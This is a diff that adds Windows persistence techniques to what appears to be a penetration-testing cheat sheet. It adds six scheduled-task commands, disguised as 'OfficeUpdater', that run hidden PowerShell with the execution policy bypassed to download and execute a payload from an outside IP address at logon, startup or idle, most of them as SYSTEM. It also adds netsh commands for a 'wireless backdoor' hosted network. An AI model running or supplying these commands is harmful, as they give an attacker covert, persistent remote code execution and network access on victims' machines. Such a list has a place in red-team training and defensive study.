@@ -910,6 +910,21 @@ Pipsec.exe
 	-lists the DACLs for each pipe
 	
 	
+Scheduled Tasks
+schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''https://111.11.1.11:8433/payload'''))'" /sc onlogon /ru System
+	--(X86) - On User Login
+schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''https://111.11.1.11:8433/payload'''))'" /sc onstart /ru System
+	--(X86) - On System Start
+schtasks /create /tn OfficeUpdaterC /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''https://111.11.1.11:8433/payload'''))'" /sc onidle /i 30
+	--(X86) - On User Idle (30mins)
+schtasks /create /tn OfficeUpdaterA /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''https://111.11.1.11:8433/payload'''))'" /sc onlogon /ru System
+	--(X64) - On User Login
+schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''https://111.11.1.11:8433/payload'''))'" /sc onstart /ru System
+	--(X64) - On System Start
+schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''https://111.11.1.11:8433/payload'''))'" /sc onidle /i 30
+	--(X64) - On User Idle (30mins)
+	
+	
 Autorun
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
@@ -936,6 +951,12 @@ AUTOSTART DIRECTORIES
 	Windows NT 5.2, 5.1, 5,0
 Windows 9x
 	%SystemDrive%\wmiOWS\Start Menu\Programs\StartUp\
+	
+	
+Wireless backdoor
+netsh wlan set hostednetwork mode=[allow\|disallow]
+netsh wlan set hostednetwork ssid=<ssid> key=<passphrase> keyUsage=persistent\|temporary
+netsh wlan [start|stop] hostednetwork
 
 	
 	
